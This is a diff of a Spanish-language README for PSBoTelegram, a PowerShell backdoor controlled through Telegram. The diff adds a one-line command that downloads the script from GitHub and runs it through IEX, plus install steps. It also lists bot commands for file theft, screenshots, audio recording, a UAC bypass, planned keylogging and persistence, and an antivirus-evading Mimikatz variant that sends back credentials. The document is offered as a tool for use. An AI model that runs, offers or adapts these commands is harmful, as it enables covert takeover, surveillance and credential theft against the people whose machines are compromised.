@@ -1,6 +1,10 @@
 # PsBoTelegram
 Backdoor using Telegram and Powershell  
 
+Podeis probar el script abriendo una consola de powershell y ejecutando este comando:
+
+**IEX (curl "https://raw.githubusercontent.com/Hackplayers/PSBoTelegram/master/PSBoTelegram.ps1" ).content**&nbsp;&nbsp;
+
         ____  _____ ____      ______     __
        / __ \/ ___// __ )____/_  __/__  / /__   ____ __________ _____ __
       / /_/ /\__ \/ __  / __ \/ / / _ \/ / _ \/ __  / ___/ __  / __  __ \
@@ -8,10 +12,22 @@ Backdoor using Telegram and Powershell
     /_/    /____/_____/\____/_/  \___/_/\___/\__, /_/   \__,_/_/ /_/ /_/
                                         /____/
 
-                                                     v0.3 by CyberVaca @ Luis Vacas
+                                                     v0.6 by CyberVaca @ HackPlayers
 
-PSBotTelegram es un script escrito en Powershell que nos crea una backdoor que se conecta a Telegram y se gestiona desde Telegram. Al ejecutar el script nos va a pedir tres datos necesarios para crear el shellcode.  
+PSBotTelegram es un script escrito en Powershell que nos crea una backdoor que se conecta a Telegram y se gestiona desde Telegram. Al ejecutar el script nos va a pedir tres datos necesarios para crear el shellcode. 
 
+# Instalación en Linux
+
+    git clone https://github.com/hackplayers/psbotelegram.git
+    sudo apt-get update > /dev/null
+    sudo apt-get install libunwind8 libicu55 
+    wget https://github.com/PowerShell/PowerShell/releases/download/v6.0.0-alpha.13/powershell_6.0.0-alpha.13-1ubuntu1.16.04.1_amd64.deb
+    sudo dpkg -i powershell_6.0.0-alpha.13-1ubuntu1.16.04.1_amd64.deb
+
+# Instalación en Windows
+
+    Powershell.exe ./PSBotelegram.ps1
+    
 Los datos que nos pide son los siguientes:  
 
 # Parametros
@@ -36,4 +52,10 @@ Una vez introducido estos datos, nos creará un shellcode en BASE64 para ejecuta
 )  
 [9]&nbsp;&nbsp;&nbsp;**/Download**&nbsp;&nbsp; (Download mas ruta nos descarga el archivo)  
 [10]&nbsp;&nbsp;**/Screenshot**&nbsp;&nbsp; (Realiza screenshot y nos lo envia)  
-[11]&nbsp;&nbsp;**/Audio**&nbsp;&nbsp; (Audio 5, Grabaria 5 segundos de audio y nos lo envia)  
+[11]&nbsp;&nbsp;**/Audio**&nbsp;&nbsp; (/Audio X, Grabaría X segundos de audio y nos lo envia)  
+[12]&nbsp;&nbsp;**/Keylogger**&nbsp;&nbsp; (/Keylogger -- proximamente)  
+[13]&nbsp;&nbsp;**/BypassUAC**&nbsp;&nbsp; (Ejecuta el Bot con privilegios administrativos)  
+[14]&nbsp;&nbsp;**/Persistence**&nbsp;&nbsp; (/Persistence -- proximamente)  
+[15]&nbsp;&nbsp;**/MimiGatoz**&nbsp;&nbsp; (Ejecuta Mimikatz modificado para el bypass AV y nos envia los datos)
+
+
